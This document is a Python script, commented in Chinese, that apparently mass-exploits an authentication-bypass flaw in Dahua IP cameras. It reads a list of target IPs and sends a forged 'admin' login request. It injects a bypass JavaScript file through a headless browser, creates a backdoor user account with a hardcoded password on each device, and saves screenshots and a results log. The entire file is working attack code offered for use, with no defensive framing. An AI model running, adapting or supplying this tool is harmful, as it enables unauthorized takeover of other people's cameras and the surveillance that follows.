# encoding=utf-8
# 大华摄像头批量利用漏洞添加账号.
import httpx
from typing import Union
import playwright
from playwright.async_api import async_playwright, Playwright, Browser
import asyncio
from pathlib import Path
from utils.log import logger
import re
from queue import Queue

basepath = Path(__file__).parent.absolute()
res_file = Path(basepath, "res.txt")
jt_photo = Path(basepath, "dh_cev")
jt_photo.mkdir(exist_ok=True)
res_file = Path(basepath, "dh_cve_res.txt")

# 按键位置配置
keyConfigs = [
    # 方案一
    {
        "set_xpath": '[t="w_Setup"]',
        "xtgl_xpath": '[t="w_Sysmanager"]',
        "yhgl_xpath": '[t="w_User Management"]',
        "adduser_xpath": '[t="w_AddUser"]',
        "save_xpath": 'xpath=/html/body/div[16]/div[3]/a[1]'
    },
    # 方案二
    {
        "set_xpath": '[t="com.Setting"]',
        "xtgl_xpath": '[t="sys.SysManage"]',
        "yhgl_xpath": '[t="sys.Account"]',
        "adduser_xpath": '[t="sys.AddUser"]',
        "save_xpath": 'xpath=/html/body/div[16]/div[3]/a[1]'
    }
]


class Dahua(object):
    def __init__(self) -> None:
        self.token = None
        # js 绕过脚本
        self.js = Path(basepath, "dahua", "bypass_js.js").read_text(
            encoding="utf8")
        self.queue = Queue()
        with Path(basepath, "dahua_cve.txt").open(mode="r", encoding="utf8") as f:
            for ip in f.read().strip().split("\n"):
                self.queue.put(ip)
        logger.info(f"共有{self.queue.qsize()}条添加到队列.")

    def read_ip(self) -> list:
        """加载ip"""
        with Path(basepath, "dahua_cve.txt").open(mode="r", encoding="utf8") as f:
            return f.read().strip().split("\n")

    async def get_token(self, addr) -> Union[bool, str]:
        header = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin":  addr+"/", "Referer":  addr+"/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

        """获取 token"""
        url = f"http://{addr}"+"/RPC2_Login"
        post_json = {"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard",
                                                                   "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                r = await client.post(url, json=post_json, headers=header)
                if r.status_code != 200:
                    logger.error(f"[-] 大华摄像头 token 获取失败 请求码:{r.status_code}")
                    return False
                r = r.json()
                if 'True' in str(r):
                    logger.info(f"[+] {addr}大华摄像头 token 获取成功!")
                    return True
        except Exception as e:
            logger.error(f"[-] {addr}大华摄像头 token 获取失败{e}...")
            return False

    async def run(self, browser: Browser, addr):
        """自适应多版本"""

        context = await browser.new_context()
        page = await browser.new_page()

        await page.goto("http://"+addr, timeout=30*1000, wait_until="domcontentloaded")
        await page.wait_for_timeout(10*1000)

        # 使用 js 脚本绕过
        await page.evaluate(self.js)
        # await page.wait_for_timeout(5*1000)

        for k, keyConfig in enumerate(keyConfigs):
            # h5playerContainer
            try:
                # 点击设置
                await page.click(f"{keyConfig['set_xpath']}", timeout=10*1000)
                await page.wait_for_timeout(3*1000)
                # 点击系统管理
                await page.click(
                    f"{keyConfig['xtgl_xpath']}")

                await page.evaluate(
                    """
                    var object2 = document.getElementById('h5playerContainer'); //通过id获取器获取对应元素
                    if (object2 != null){
                        object2.parentNode.removeChild(object2);     //删除对应的元素信息
                    }
                    """
                )

                # 点击 系统管理->用户管理
                await page.click(
                    f"{keyConfig['yhgl_xpath']}")
                await page.wait_for_timeout(4*1000)
                # 点击增加用户
                await page.click(
                    f"{keyConfig['adduser_xpath']}")
                await page.wait_for_timeout(5*1000)
                # 输入用户名
                await page.fill("id=use_AUserName", "hyy")
                # 输入密码
                await page.fill("id=use_AUserPwd", "12345678A")
                # 确定密码
                await page.fill("id=use_AUserPwdCfm", "12345678A")
                # 保存
                # 滚动直到元素可见
                # await page.wait_for_timeout(5*1000)
                await page.wait_for_load_state('load')
                await page.click(f"{keyConfig['save_xpath']}")
                await page.wait_for_timeout(5*1000)
                # 截图
                await page.screenshot(path=Path(jt_photo, f"{addr}.png"))
                return True
            except playwright._impl._api_types.TimeoutError:
                logger.error(f"{addr}使用方案{k+1}失败,正在切换方案....")
                if k+1 == len(keyConfigs):
                    logger.exception("使用全部方案均失败....截图保存当前页面...")
                    await page.screenshot(path=Path(jt_photo, f"error-{addr}.png"))
                    return False
            finally:
                pass

    async def async_run(self):
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            while not self.queue.empty():
                addr = self.queue.get()
                if await self.get_token(addr):

                    res = await self.run(browser, addr)
                    if res:
                        logger.success(f"[+] {addr}成功!")
                        save_res(f"[+] {addr}成功!")
                    else:
                        logger.error(f"[-] {addr} 失败!")
                        save_res(f"[-] {addr}错误.....")

    async def main(self):
        await asyncio.gather(
            *(
                self.async_run()
                for _ in range(3)
            )
        )

    async def _debug(self):
        """调试"""
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=False)
            await self.run(browser, "10.100.2.20")


def filter():
    """从 res.txt 中过滤大华web漏洞ip"""
    with res_file.open(mode="r", encoding="utf8") as fp:
        cs = fp.read().strip().split("\n")
        # print(c)
        lst = []
        for c in cs:
            if "大华web漏洞" in c:
                # lst.append()
                lst.append((re.findall("\] (\S+)存在", c)[0]))
    with Path(basepath, "dahua_cve.txt").open(mode="a", encoding="utf8") as f:
        for l in lst:
            f.write(l+"\n")


def save_res(msg):
    """保存渗透结果"""
    with res_file.open(mode="a", encoding="utf8") as fp:
        fp.write(msg+"\n")


if __name__ == "__main__":
    # pass
    asyncio.run(Dahua().main())
    # asyncio.run(Dahua()._debug())
